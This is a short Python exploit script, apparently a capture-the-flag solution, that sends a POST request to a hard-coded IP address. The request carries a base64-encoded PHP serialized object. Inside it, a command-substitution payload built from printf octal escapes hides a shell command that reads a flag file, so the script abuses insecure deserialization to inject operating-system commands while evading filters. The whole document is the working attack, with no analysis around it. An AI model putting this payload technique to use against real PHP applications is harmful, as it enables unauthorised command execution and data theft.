import requests

headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36'
}
data = {
    'ctf': 'Tzo0OiJlYXNlIjoyOntzOjEyOiIAZWFzZQBtZXRob2QiO3M6NDoicGluZyI7czoxMDoiAGVhc2UAYXJncyI7YToxOntpOjA7czoxNjQ6IiQocHJpbnRmCSJcMTQzXDE0MVwxNjRcNDBcMTQ2XDE1NFwxNDFcMTQ3XDEzN1w2MVwxNjNcMTM3XDE1MFwxNDVcMTYyXDE0NVw1N1wxNDZcMTU0XDE0MVwxNDdcMTM3XDcwXDYzXDYxXDE0Mlw2Nlw3MVw2MFw2MVw2MlwxNDNcNjZcNjdcMTQyXDYzXDY1XDE0Nlw1NlwxNjBcMTUwXDE2MCIpIjt9fQ=='
}
proxies = {
    'http': 'http://127.0.0.1:8080'
}
req = requests.post('http://61.147.171.105:60084/index.php', data = data, headers = headers)
print(req.text)